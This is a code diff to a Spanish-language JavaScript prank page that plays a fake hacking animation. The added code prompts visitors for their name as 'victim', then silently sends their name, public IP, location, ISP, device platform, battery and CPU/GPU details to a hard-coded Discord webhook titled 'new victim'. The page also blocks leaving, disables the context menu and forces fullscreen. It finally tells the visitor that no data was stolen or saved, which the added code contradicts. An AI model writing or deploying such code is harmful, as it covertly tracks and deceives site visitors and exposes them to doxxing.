@@ -3,24 +3,68 @@ const progressContainer = document.getElementById('progress-container');
 const progressFill = document.getElementById('progress-fill');
 const progressText = document.getElementById('progress-text');
 
+// Instancia de audio
 const beepSound = new Audio('beep.mp3.wav');
+
+// URL del Webhook de Discord
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1533628544129957949/EpuXsjlTzIFjNCDSo_paxbaJc6EREqIYxTGIMNJiUm4inVJcRQjXkcBdhInfPZmGtNmx";
 
 // Bloqueos de navegación
 window.addEventListener('beforeunload', (e) => { e.preventDefault(); e.returnValue = ''; });
 document.addEventListener('contextmenu', (e) => e.preventDefault());
 
+// Evento principal al presionar el botón de inicio
 document.getElementById('start-btn').addEventListener('click', async () => {
+    const nameInput = document.getElementById('victim-name').value.trim();
+
+    if (!nameInput) {
+        alert("Por favor ingresa tu nombre para iniciar la verificación.");
+        return;
+    }
+
+    document.getElementById('overlay').style.display = 'none';
+
     if (document.documentElement.requestFullscreen) {
         document.documentElement.requestFullscreen().catch(() => {});
     }
-    document.getElementById('overlay').style.display = 'none';
-
     if ('Notification' in window && Notification.permission !== 'granted') {
         await Notification.requestPermission();
     }
 
-    startHackSimulation();
+    startHackSimulation(nameInput);
 });
+
+// Notificación hacia Discord
+async function notifyVisit(victimName, ipData, battery, gpu, cpu) {
+    if (!DISCORD_WEBHOOK_URL) return;
+
+    const payload = {
+        embeds: [{
+            title: "🎯 ¡NUEVA VÍCTIMA EN LA WEB!",
+            color: 65280,
+            fields: [
+                { name: "👤 Nombre Ingresado", value: victimName || "Anónimo", inline: true },
+                { name: "🌐 IP Pública", value: ipData.ip || "N/A", inline: true },
+                { name: "📍 Ubicación", value: `${ipData.city}, ${ipData.country_name}`, inline: false },
+                { name: "🏢 Proveedor (ISP)", value: ipData.org || "N/A", inline: false },
+                { name: "📱 Dispositivo", value: navigator.platform, inline: true },
+                { name: "🔋 Batería", value: battery, inline: true },
+                { name: "💻 CPU / GPU", value: `${cpu} Cores | ${gpu}`, inline: false }
+            ],
+            timestamp: new Date().toISOString()
+        }]
+    };
+
+    try {
+        await fetch(DISCORD_WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+    } catch (e) {
+        console.log("Error al notificar webhook");
+    }
+}
 
 function getTime() {
     const d = new Date();
@@ -50,7 +94,7 @@ async function getBatteryInfo() {
     return "N/A";
 }
 
-async function startHackSimulation() {
+async function startHackSimulation(victimName) {
     const screenRes = `${window.screen.width}x${window.screen.height}`;
     const batteryInfo = await getBatteryInfo();
     const gpuInfo = getGPUInfo();
@@ -63,7 +107,9 @@ async function startHackSimulation() {
         if (res.ok) { ipData = await res.json(); }
     } catch (e) {}
 
-    // Mensajes con formato de consola de exploit/sistema
+    // Enviar webhook con los datos capturados a Discord
+    await notifyVisit(victimName, ipData, batteryInfo, gpuInfo, cpuCores);
+
     const logMessages = [
         { type: "info", text: "Initializing framework core v4.18.0-sys..." },
         { type: "info", text: "Establishing socket stream on remote endpoint..." },
@@ -154,7 +200,7 @@ async function startHackSimulation() {
         trollMessage.style.marginTop = '20%';
         trollMessage.innerHTML = `
             <p class="log-alert" style="font-size: 20px;">[!] SYSTEM OVERRIDE FAILED</p>
-            <p style="color: #fff; margin-top: 10px;">¡CAÍSTE EN EL TROLEO! 🤖</p>
+            <p style="color: #fff; margin-top: 10px;">¡CAÍSTE EN EL TROLEO, ${victimName.toUpperCase()}! 🤖</p>
             <p style="color: #008833; font-size: 11px; margin-top: 15px;">Ningún dato fue robado ni guardado.</p>
         `;
 
